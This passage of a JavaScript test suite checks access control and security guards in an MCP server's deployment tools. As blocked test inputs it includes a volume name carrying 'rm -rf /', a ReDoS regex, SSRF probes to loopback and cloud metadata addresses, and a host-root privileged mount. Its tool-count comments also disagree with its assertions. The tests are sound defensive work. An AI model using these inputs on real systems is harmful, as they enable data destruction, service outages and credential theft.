      { level: 'error', releaseId: 'rel_101', message: 'Stripe webhook timeout after 5000ms' }
    ]);
    logArchiveService.appendLogs(projB.id, [
      { level: 'error', releaseId: 'rel_999', message: 'FOREIGN_TENANT_SECRET_LOG_LINE' }
    ]);

    const logIdor = await mcpServer.executeTool('culkibo_log_archive_search', {
      action: 'search',
      projectId: projB.id,
      query: 'FOREIGN'
    }, { auth: scopedViewerAuth });
    assert.strictEqual(logIdor.isError, true);
    assert.strictEqual(JSON.parse(logIdor.content[0].text).code, 'FORBIDDEN');

    const logOk = await mcpServer.executeTool('culkibo_log_archive_search', {
      action: 'search',
      projectId: projA.id,
      level: 'error',
      regex: 'Stripe.*timeout'
    }, { auth: scopedViewerAuth });
    assert.strictEqual(logOk.isError, false);
    assert.strictEqual(logOk.structuredContent.search.totalMatches, 1);

    const logRedos = await mcpServer.executeTool('culkibo_log_archive_search', {
      action: 'search',
      projectId: projA.id,
      regex: '(a+)+$'
    }, { auth: scopedViewerAuth });
    assert.strictEqual(logRedos.isError, true);
    assert.strictEqual(JSON.parse(logRedos.content[0].text).code, 'UNSAFE_REGEX');

    const logStats = await mcpServer.executeTool('culkibo_log_archive_search', { action: 'stats' }, { auth: scopedViewerAuth });
    assert.strictEqual(logStats.isError, false);
    assert.ok(!JSON.stringify(logStats.structuredContent).includes(projB.id), 'Log archive stats jamás puede filtrar otros proyectos');
    console.log('  ✓ culkibo_log_archive_search verificado (RO viewer, .ndjson.gz search, UNSAFE_REGEX ReDoS block y anti-IDOR)');

    // 6. Final Cycle-10 milestone assertion: exact 160 tools & ?profile=core 17/160 >=86% token savings!
    const all135 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved135Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all135), 'utf8')) * 1000) / 10;
    assert.strictEqual(all135.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved135Pct >= 86, `?profile=core debe ahorrar >=86% tokens en 160 tools (actual: ${saved135Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-10 Milestone verificado: 160 tools exactas, ?profile=core 17/160 (-${saved135Pct}% tokens/bytes)`);
  } finally {
    databaseManager.list = origDbList;
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    if ('_loadedPath' in backupDrillService) backupDrillService._loadedPath = null;
    if ('_loadedPath' in remoteBuilderService) remoteBuilderService._loadedPath = null;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-11 Milestone: Policy-as-Code Admission (`culkibo_admission_check`),
 * Ed25519 Compliance Bundle (`culkibo_compliance_bundle`), 4-Phase Volume Migration (`culkibo_volume_migrate`),
 * Edge Geo/A-B Experiments (`culkibo_edge_experiment`), Unified Security Posture (`culkibo_security_posture`),
 * and `-87%+` `?profile=core` at 140 tools.
 */
async function testMcp2026Cycle11AdmissionComplianceVolumeEdgePosture() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const volumeMigrationService = require('../server/services/volumeMigrationService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c11-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;
  volumeMigrationService._loaded = false;
  volumeMigrationService.state = { version: 1, migrations: [] };

  const projA = projectManager.create({
    name: 'Cycle11 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle11 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c11_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c11_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c11_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_admission_check (dev/admin evaluate, admin-only apply_preset w/ dryRun default, - /:/host:rw DENY)
    const admViewerBlocked = await mcpServer.executeTool('culkibo_admission_check', { action: 'get_policy' }, { auth: scopedViewerAuth });
    assert.strictEqual(admViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(admViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const admRootMount = await mcpServer.executeTool('culkibo_admission_check', {
      action: 'evaluate',
      preset: 'baseline',
      spec: {
        image: 'ghcr.io/acme/app:v1.0.0',
        privileged: true,
        mounts: ['/:/host:rw'],
        ports: ['0.0.0.0:5432:5432']
      }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(admRootMount.isError, false);
    assert.strictEqual(admRootMount.structuredContent.ok, false);
    assert.strictEqual(admRootMount.structuredContent.evaluation.decision, 'DENY');
    const violIds = admRootMount.structuredContent.evaluation.enforcedViolations.map((v) => v.id);
    assert.ok(violIds.includes('no_host_root_mount') && violIds.includes('no_privileged') && violIds.includes('no_public_db_or_panel_bind'));

    const admHardened = await mcpServer.executeTool('culkibo_admission_check', {
      action: 'evaluate',
      preset: 'soc2-strict',
      spec: {
        image: 'ghcr.io/acme/api:v2.4.1',
        privileged: false,
        uid: 1000,
        memoryLimitMb: 512,
        cpuLimit: 1,
        healthcheckPath: '/health',
        attestationVerified: true
      }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(admHardened.isError, false);
    assert.strictEqual(admHardened.structuredContent.ok, true);
    assert.strictEqual(admHardened.structuredContent.evaluation.decision, 'ALLOW');
    assert.strictEqual(admHardened.structuredContent.evaluation.score, 100);

    // Developer blocked from apply_preset even with dryRun: true
    const admPresetDevBlocked = await mcpServer.executeTool('culkibo_admission_check', {
      action: 'apply_preset',
      preset: 'soc2-strict',
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(admPresetDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(admPresetDevBlocked.content[0].text).code, 'FORBIDDEN');

    // Admin apply_preset omitting dryRun -> dryRun: true, applied: false
    const admPresetDry = await mcpServer.executeTool('culkibo_admission_check', {
      action: 'apply_preset',
      preset: 'restricted'
    });
    assert.strictEqual(admPresetDry.isError, false);
    assert.strictEqual(admPresetDry.structuredContent.dryRun, true);
    assert.strictEqual(admPresetDry.structuredContent.applied, false);

    // Admin apply_preset with dryRun: false -> persists restricted
    const admPresetLive = await mcpServer.executeTool('culkibo_admission_check', {
      action: 'apply_preset',
      preset: 'restricted',
      dryRun: false
    });
    assert.strictEqual(admPresetLive.isError, false);
    assert.strictEqual(admPresetLive.structuredContent.applied, true);
    assert.strictEqual(admPresetLive.structuredContent.policy.preset, 'restricted');
    console.log('  ✓ culkibo_admission_check verificado (10 CIS rules, - /:/host:rw & 0.0.0.0:5432 DENY, admin apply_preset dryRun default)');

    // 2. culkibo_compliance_bundle (RO admin, REDACTED_RESULT_TOOLS, Ed25519 sign + 1-byte tamper detection)
    const compDevBlocked = await mcpServer.executeTool('culkibo_compliance_bundle', { action: 'generate' }, { auth: unscopedDevAuth });
    assert.strictEqual(compDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(compDevBlocked.content[0].text).code, 'FORBIDDEN');

    const compGen = await mcpServer.executeTool('culkibo_compliance_bundle', { action: 'generate', framework: 'all' });
    assert.strictEqual(compGen.isError, false);
    const bundle = compGen.structuredContent.bundle;
    assert.strictEqual(bundle.algorithm, 'Ed25519');
    assert.ok(typeof bundle.signatureB64 === 'string' && bundle.signatureB64.length > 20);
    assert.ok(typeof bundle.markdownReport === 'string' && bundle.markdownReport.includes('SOC2'));
    assert.ok(!JSON.stringify(bundle).includes('PRIVATE KEY'), 'Compliance bundle JAMÁS debe exponer claves privadas');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');

    const compVerOk = await mcpServer.executeTool('culkibo_compliance_bundle', { action: 'verify', bundle });
    assert.strictEqual(compVerOk.isError, false);
    assert.strictEqual(compVerOk.structuredContent.ok, true);
    assert.strictEqual(compVerOk.structuredContent.verification.valid, true);

    const tampered = JSON.parse(JSON.stringify(bundle));
    tampered.payload.overallScore = 100 === tampered.payload.overallScore ? 99 : 100;
    const compVerTamper = await mcpServer.executeTool('culkibo_compliance_bundle', { action: 'verify', bundle: tampered });
    assert.strictEqual(compVerTamper.isError, false);
    assert.strictEqual(compVerTamper.structuredContent.ok, false);
    assert.strictEqual(compVerTamper.structuredContent.verification.valid, false);
    console.log('  ✓ culkibo_compliance_bundle verificado (admin RBAC, Ed25519 sign/verify, 1-byte tamper detect y auditoría redactada)');

    // 3. culkibo_volume_migrate (dev/admin, strict project ACL, CVE-2025-66213 & --numeric-owner 999:999)
    const volIdor = await mcpServer.executeTool('culkibo_volume_migrate', {
      action: 'plan',
      projectId: projB.id,
      volumeName: 'pg_foreign',
      mountPath: '/var/lib/postgresql/data',
      targetHost: '10.88.0.22'
    }, { auth: scopedDevAuth });
    assert.strictEqual(volIdor.isError, true);
    assert.strictEqual(JSON.parse(volIdor.content[0].text).code, 'FORBIDDEN');

    const volCve = await mcpServer.executeTool('culkibo_volume_migrate', {
      action: 'plan',
      projectId: projA.id,
      volumeName: 'pgdata;rm -rf /',
      mountPath: '/var/lib/postgresql/data',
      targetHost: '10.88.0.22'
    }, { auth: scopedDevAuth });
    assert.strictEqual(volCve.isError, true);

    const volOk = await mcpServer.executeTool('culkibo_volume_migrate', {
      action: 'plan',
      projectId: projA.id,
      volumeName: 'pg_tenant_a_data',
      mountPath: '/var/lib/postgresql/data',
      targetHost: '10.88.0.22',
      uid: 999,
      gid: 999,
      containerName: 'culkibo_pg_a'
    }, { auth: scopedDevAuth });
    assert.strictEqual(volOk.isError, false);
    assert.strictEqual(volOk.structuredContent.migration.zeroShell, true);
    assert.strictEqual(volOk.structuredContent.migration.uidGid, '999:999');
    assert.strictEqual(volOk.structuredContent.migration.phases.length, 4);
    assert.ok(JSON.stringify(volOk.structuredContent.migration.phases).includes('--numeric-owner'));
    console.log('  ✓ culkibo_volume_migrate verificado (CVE-2025-66213 block, 4 fases --numeric-owner 999:999 y anti-IDOR)');

    // 4. culkibo_edge_experiment (dev/admin, project ACL, Geo ISO-3166 & A/B sticky cookie, dryRun default & kill-switch)
    const expIdor = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'upsert',
      projectId: projB.id,
      hostname: 'foreign.acme.dev',
      kind: 'ab',
      variants: [
        { name: 'control', upstream: '127.0.0.1:4201', weight: 50 },
        { name: 'variant', upstream: '127.0.0.1:4202', weight: 50 }
      ]
    }, { auth: scopedDevAuth });
    assert.strictEqual(expIdor.isError, true);
    assert.strictEqual(JSON.parse(expIdor.content[0].text).code, 'FORBIDDEN');

    const expBadCountry = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'compile',
      kind: 'geo',
      hostname: 'shop.acme.dev',
      regions: [{ countries: ['ZZZ'], upstream: '127.0.0.1:4201' }],
      defaultUpstream: '127.0.0.1:4200'
    }, { auth: scopedDevAuth });
    assert.strictEqual(expBadCountry.isError, true);

    const expBadWeights = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'upsert',
      projectId: projA.id,
      hostname: 'shop.acme.dev',
      kind: 'ab',
      variants: [
        { name: 'control', upstream: '127.0.0.1:4201', weight: 40 },
        { name: 'variant', upstream: '127.0.0.1:4202', weight: 40 }
      ]
    }, { auth: scopedDevAuth });
    assert.strictEqual(expBadWeights.isError, true);

    const expDryUpsert = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'upsert',
      projectId: projA.id,
      hostname: 'shop.acme.dev',
      kind: 'ab',
      stickyMode: 'cookie',
      variants: [
        { name: 'control', upstream: '127.0.0.1:4201', weight: 50 },
        { name: 'variant', upstream: '127.0.0.1:4202', weight: 50 }
      ]
    }, { auth: scopedDevAuth });
    assert.strictEqual(expDryUpsert.isError, false);
    assert.strictEqual(expDryUpsert.structuredContent.dryRun, true);
    assert.strictEqual(expDryUpsert.structuredContent.upserted, false);

    const expLive = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'upsert',
      projectId: projA.id,
      hostname: 'shop.acme.dev',
      kind: 'ab',
      stickyMode: 'cookie',
      variants: [
        { name: 'control', upstream: '127.0.0.1:4201', weight: 50 },
        { name: 'variant', upstream: '127.0.0.1:4202', weight: 50 }
      ],
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(expLive.isError, false);
    assert.strictEqual(expLive.structuredContent.upserted, true);
    const expId = expLive.structuredContent.experiment.id;

    const killDry = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'kill_switch',
      experimentId: expId
    }, { auth: scopedDevAuth });
    assert.strictEqual(killDry.isError, false);
    assert.strictEqual(killDry.structuredContent.dryRun, true);
    assert.strictEqual(killDry.structuredContent.killed, false);

    const killLive = await mcpServer.executeTool('culkibo_edge_experiment', {
      action: 'kill_switch',
      experimentId: expId,
      reason: 'regression_detected',
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(killLive.isError, false);
    assert.strictEqual(killLive.structuredContent.killed, true);
    assert.strictEqual(killLive.structuredContent.experiment.killed, true);
    console.log('  ✓ culkibo_edge_experiment verificado (ISO-3166 & weight=100 guard, sticky cookie A/B, dryRun default y kill-switch 100% control)');

    // 5. culkibo_security_posture (RO viewer allowed, unified executive scorecard)
    const postureViewer = await mcpServer.executeTool('culkibo_security_posture', {}, { auth: scopedViewerAuth });
    assert.strictEqual(postureViewer.isError, false);
    assert.strictEqual(postureViewer.structuredContent.ok, true);
    assert.ok(postureViewer.structuredContent.postureScore >= 0 && postureViewer.structuredContent.postureScore <= 100);
    assert.strictEqual(postureViewer.structuredContent.pillars.admission.preset, 'restricted');
    assert.strictEqual(postureViewer.structuredContent.pillars.compliance.hasBundle, true);
    assert.strictEqual(postureViewer.structuredContent.pillars.compliance.signedAlgorithm, 'Ed25519');
    console.log(`  ✓ culkibo_security_posture verificado (RO viewer, score=${postureViewer.structuredContent.postureScore}/100 grade=${postureViewer.structuredContent.grade})`);

    // 6. Final Cycle-11 milestone assertion: exact 160 tools & ?profile=core 17/160 >=87% token reduction!
    const all140 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved140Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all140), 'utf8')) * 1000) / 10;
    assert.strictEqual(all140.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved140Pct >= 87, `?profile=core debe ahorrar >=87% tokens en 160 tools (actual: ${saved140Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-11 Milestone verificado: 160 tools exactas, ?profile=core 17/160 (-${saved140Pct}% tokens/bytes)`);
  } finally {
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    volumeMigrationService._loaded = false;
    volumeMigrationService.state = { version: 1, migrations: [] };
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-12 Milestone: Synthetic API Flow & TLS/SNI Sentinel (`culkibo_synthetic_sentinel`),
 * Zero-Downtime SQL Migration Linter (`culkibo_lint_sql_migration`), OOM-Safe KEDA Worker Autoscaler (`culkibo_worker_autoscaler`),
 * CycloneDX 1.6 SPDX License Risk Auditor (`culkibo_audit_licenses`), Least-Privilege Seccomp & `runc` CVE Guard (`culkibo_seccomp_profile`),
 * and `-88%+` `?profile=core` at 145 tools.
 */
async function testMcp2026Cycle12SyntheticSqlAutoscalerLicenseSeccomp() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c12-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;

  const projA = projectManager.create({
    name: 'Cycle12 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle12 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c12_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c12_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c12_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_synthetic_sentinel (RBAC dev/admin, save_flow admin-only + dryRun default, secret redaction, SSRF allowLoopback=false)
    const synthViewerBlocked = await mcpServer.executeTool('culkibo_synthetic_sentinel', { action: 'list_flows' }, { auth: scopedViewerAuth });
    assert.strictEqual(synthViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(synthViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const synthDevList = await mcpServer.executeTool('culkibo_synthetic_sentinel', { action: 'list_flows' }, { auth: unscopedDevAuth });
    assert.strictEqual(synthDevList.isError, false);
    assert.ok(Array.isArray(synthDevList.structuredContent.flows));

    const synthDevSaveBlocked = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'save_flow',
      flow: { name: 'Dev Attempt', steps: [{ url: 'https://example.com/health' }] },
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(synthDevSaveBlocked.isError, true);
    assert.strictEqual(JSON.parse(synthDevSaveBlocked.content[0].text).code, 'FORBIDDEN');

    const synthSaveDry = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'save_flow',
      flow: {
        name: 'Checkout Canary Flow',
        steps: [
          {
            name: 'login',
            method: 'POST',
            url: 'https://api.example.com/auth/login',
            headers: { Authorization: 'Bearer sk_live_synth_canary_999999' },
            body: { username: 'probe', password: 'SuperSecretPassword123!' },
            extract: { sessionToken: 'data.token' }
          },
          {
            name: 'profile',
            method: 'GET',
            url: 'https://api.example.com/me',
            headers: { Authorization: 'Bearer {{sessionToken}}' },
            assert: { status: 200 }
          }
        ]
      }
    });
    assert.strictEqual(synthSaveDry.isError, false);
    assert.strictEqual(synthSaveDry.structuredContent.dryRun, true);
    assert.strictEqual(synthSaveDry.structuredContent.saved, false);
    assert.strictEqual(fs.existsSync(path.join(tmpDataRoot, 'data', 'synthetic-flows.json')), false, 'save_flow dryRun default jamás debe escribir a disco');

    const synthSaveLive = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'save_flow',
      dryRun: false,
      flow: {
        name: 'Checkout Canary Flow',
        steps: [
          {
            name: 'login',
            method: 'POST',
            url: 'https://api.example.com/auth/login',
            headers: { Authorization: 'Bearer sk_live_synth_canary_999999' },
            body: { username: 'probe', password: 'SuperSecretPassword123!' },
            extract: { sessionToken: 'data.token' }
          },
          {
            name: 'profile',
            method: 'GET',
            url: 'https://api.example.com/me',
            headers: { Authorization: 'Bearer {{sessionToken}}' },
            assert: { status: 200 }
          }
        ]
      }
    });
    assert.strictEqual(synthSaveLive.isError, false);
    assert.strictEqual(synthSaveLive.structuredContent.saved, true);
    assert.strictEqual(synthSaveLive.structuredContent.flow.steps[0].headers.Authorization, '[REDACTED]');
    assert.strictEqual(synthSaveLive.structuredContent.flow.steps[0].body.password, '[REDACTED]');
    assert.strictEqual(synthSaveLive.structuredContent.flow.steps[1].headers.Authorization, 'Bearer {{sessionToken}}');
    const savedDiskRaw = fs.readFileSync(path.join(tmpDataRoot, 'data', 'synthetic-flows.json'), 'utf8');
    assert.ok(!savedDiskRaw.includes('sk_live_synth_canary_999999') && !savedDiskRaw.includes('SuperSecretPassword123!'), 'synthetic-flows.json jamás puede almacenar secretos en claro');
    assert.strictEqual(mcpServer.getAuditLog(1)[0].resultSummary, '[resultado sensible ocultado en auditoría]');

    // run_flow strictly enforces allowLoopback: false (blocks 127.0.0.1 and 169.254.169.254)
    const runLoopback = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'run_flow',
      flow: { name: 'Loopback Probe', steps: [{ url: 'http://127.0.0.1:9999/internal' }] }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(runLoopback.isError, false);
    assert.strictEqual(runLoopback.structuredContent.ok, false);
    assert.ok(JSON.stringify(runLoopback.structuredContent.run).includes('SSRF_BLOCKED'));

    const runMeta = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'run_flow',
      flow: { name: 'Metadata Probe', steps: [{ url: 'http://169.254.169.254/latest/meta-data/' }] }
    }, { auth: unscopedDevAuth });
    assert.strictEqual(runMeta.isError, false);
    assert.strictEqual(runMeta.structuredContent.ok, false);
    assert.ok(JSON.stringify(runMeta.structuredContent.run).includes('SSRF_BLOCKED'));

    // check_tls blocks cloud metadata & loopback via SSRF guard
    const tlsMetaBlocked = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'check_tls',
      host: '169.254.169.254'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(tlsMetaBlocked.isError, true);
    assert.strictEqual(JSON.parse(tlsMetaBlocked.content[0].text).code, 'SSRF_BLOCKED');

    const tlsLoopbackBlocked = await mcpServer.executeTool('culkibo_synthetic_sentinel', {
      action: 'check_tls',
      host: '127.0.0.1'
    }, { auth: unscopedDevAuth });
    assert.strictEqual(tlsLoopbackBlocked.isError, true);
    assert.strictEqual(JSON.parse(tlsLoopbackBlocked.content[0].text).code, 'SSRF_BLOCKED');
    console.log('  ✓ culkibo_synthetic_sentinel verificado (RBAC admin save_flow, dryRun default, redacción cero-secretos y SSRF block)');

    // 2. culkibo_lint_sql_migration (RO viewer allowed, unsafe blockers vs safe DDL)
    const sqlUnsafe = await mcpServer.executeTool('culkibo_lint_sql_migration', {
      sql: 'CREATE INDEX idx_users_email ON users(email); DROP TABLE legacy_sessions;'
    }, { auth: scopedViewerAuth });
    assert.strictEqual(sqlUnsafe.isError, false);
    assert.strictEqual(sqlUnsafe.structuredContent.safe, false);
    assert.strictEqual(sqlUnsafe.structuredContent.ok, false);
    assert.ok(sqlUnsafe.structuredContent.blockers.length >= 3);
    const sqlRules = sqlUnsafe.structuredContent.blockers.map((b) => b.rule);
    assert.ok(sqlRules.includes('MISSING_LOCK_TIMEOUT') && sqlRules.includes('CREATE_INDEX_NOT_CONCURRENT') && sqlRules.includes('DESTRUCTIVE_DROP_COLUMN_OR_TABLE'));

    const sqlSafe = await mcpServer.executeTool('culkibo_lint_sql_migration', {
      sql: "SET lock_timeout = '5s'; SET statement_timeout = '30s'; CREATE INDEX CONCURRENTLY idx_users_email ON users(email);"
    }, { auth: scopedViewerAuth });
    assert.strictEqual(sqlSafe.isError, false);
    assert.strictEqual(sqlSafe.structuredContent.safe, true);
    assert.strictEqual(sqlSafe.structuredContent.ok, true);
    assert.strictEqual(sqlSafe.structuredContent.blockers.length, 0);
    assert.strictEqual(sqlSafe.structuredContent.score, 100);
    console.log('  ✓ culkibo_lint_sql_migration verificado (RO viewer, blockers DDL vs safe CONCURRENTLY score=100)');

    // 3. culkibo_worker_autoscaler (RBAC, strict project ACL, dryRun default, RAM ceiling, cooldown & 503 breaker)
    const autoViewerBlocked = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'get_policy',
      projectId: projA.id
    }, { auth: scopedViewerAuth });
    assert.strictEqual(autoViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(autoViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const autoIdor = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'get_policy',
      projectId: projB.id
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoIdor.isError, true);
    assert.strictEqual(JSON.parse(autoIdor.content[0].text).code, 'FORBIDDEN');

    const autoDrySet = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'set_policy',
      projectId: projA.id,
      policy: { maxReplicas: 8, perReplicaRamMb: 512, reserveHostRamMb: 512, breakerQueueThreshold: 400, scaleUpCooldownSec: 60 }
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoDrySet.isError, false);
    assert.strictEqual(autoDrySet.structuredContent.dryRun, true);
    assert.strictEqual(autoDrySet.structuredContent.saved, false);

    const autoLiveSet = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'set_policy',
      projectId: projA.id,
      policy: { maxReplicas: 8, perReplicaRamMb: 512, reserveHostRamMb: 512, breakerQueueThreshold: 400, scaleUpCooldownSec: 60 },
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoLiveSet.isError, false);
    assert.strictEqual(autoLiveSet.structuredContent.saved, true);
    assert.strictEqual(autoLiveSet.structuredContent.policy.maxReplicas, 8);

    // RAM ceiling cap: hostFreeRamMb=1600, reserve=512, perReplica=512 -> maxSafeReplicas = floor(1088/512) = 2!
    const autoRamCap = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'evaluate',
      projectId: projA.id,
      queueDepth: 200,
      currentReplicas: 1,
      hostFreeRamMb: 1600
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoRamCap.isError, false);
    assert.strictEqual(autoRamCap.structuredContent.decision.maxSafeReplicas, 2);
    assert.strictEqual(autoRamCap.structuredContent.decision.targetReplicas, 2);
    assert.strictEqual(autoRamCap.structuredContent.decision.action, 'SCALE_UP');

    // Cooldown anti-flapping: scaled 10s ago (< 60s scaleUpCooldownSec) -> HOLD COOLDOWN_ACTIVE
    const autoCooldown = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'evaluate',
      projectId: projA.id,
      queueDepth: 100,
      currentReplicas: 1,
      hostFreeRamMb: 4096,
      lastScaleAtMs: Date.now() - 10000
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoCooldown.isError, false);
    assert.strictEqual(autoCooldown.structuredContent.decision.action, 'HOLD');
    assert.strictEqual(autoCooldown.structuredContent.decision.reason, 'COOLDOWN_ACTIVE');

    // 503 Retry-After circuit breaker: queueDepth 600 >= 400 -> OPEN
    const autoBreaker = await mcpServer.executeTool('culkibo_worker_autoscaler', {
      action: 'evaluate',
      projectId: projA.id,
      queueDepth: 600,
      currentReplicas: 2,
      hostFreeRamMb: 4096
    }, { auth: scopedDevAuth });
    assert.strictEqual(autoBreaker.isError, false);
    assert.strictEqual(autoBreaker.structuredContent.decision.circuitBreaker.state, 'OPEN');
    assert.strictEqual(autoBreaker.structuredContent.decision.circuitBreaker.httpStatus, 503);
    assert.ok(autoBreaker.structuredContent.decision.circuitBreaker.retryAfterSec >= 1);
    console.log('  ✓ culkibo_worker_autoscaler verificado (anti-IDOR, dryRun default, techo RAM OOM-safe, cooldown y breaker 503)');

    // 4. culkibo_audit_licenses (RO viewer allowed, AGPL/SSPL/LicenseRef-* blocked on saas-strict, MIT/OR pass, audit-only warns)
    const riskySbom = {
      bomFormat: 'CycloneDX',
      specVersion: '1.6',
      components: [
        { name: 'ok-lib', version: '1.0.0', licenses: [{ license: { id: 'MIT' } }] },
        { name: 'pdf-agpl', version: '2.0.0', licenses: [{ license: { id: 'AGPL-3.0-only' } }] },
        { name: 'db-sspl', version: '1.0.0', licenses: [{ license: { id: 'SSPL-1.0' } }] },
        { name: 'custom-ref', version: '0.1.0', licenses: [{ expression: 'LicenseRef-Proprietary' }] }
      ]
    };
    const licStrict = await mcpServer.executeTool('culkibo_audit_licenses', {
      policy: 'saas-strict',
      sbom: riskySbom
    }, { auth: scopedViewerAuth });
    assert.strictEqual(licStrict.isError, false);
    assert.strictEqual(licStrict.structuredContent.compliant, false);
    assert.strictEqual(licStrict.structuredContent.ok, false);
    assert.strictEqual(licStrict.structuredContent.violations.length, 3);

    const licAuditOnly = await mcpServer.executeTool('culkibo_audit_licenses', {
      policy: 'audit-only',
      sbom: riskySbom
    }, { auth: scopedViewerAuth });
    assert.strictEqual(licAuditOnly.isError, false);
    assert.strictEqual(licAuditOnly.structuredContent.compliant, true);
    assert.strictEqual(licAuditOnly.structuredContent.warnings.length, 3);

    const licClean = await mcpServer.executeTool('culkibo_audit_licenses', {
      policy: 'saas-strict',
      sbom: {
        bomFormat: 'CycloneDX',
        specVersion: '1.6',
        components: [
          { name: 'fast-json', version: '1.0.0', licenses: [{ license: { id: 'MIT' } }] },
          { name: 'dual-lib', version: '2.0.0', licenses: [{ expression: '(MIT OR GPL-3.0-only)' }] }
        ]
      }
    }, { auth: scopedViewerAuth });
    assert.strictEqual(licClean.isError, false);
    assert.strictEqual(licClean.structuredContent.compliant, true);
    assert.strictEqual(licClean.structuredContent.score, 100);
    console.log('  ✓ culkibo_audit_licenses verificado (RO viewer, AGPL/SSPL/LicenseRef-* bloqueados, OR permisivo y audit-only)');

    // 5. culkibo_seccomp_profile (dev/admin RBAC, generate node, SECCOMP_UNCONFINED_FORBIDDEN, validate & runc CVE-2025-31133)
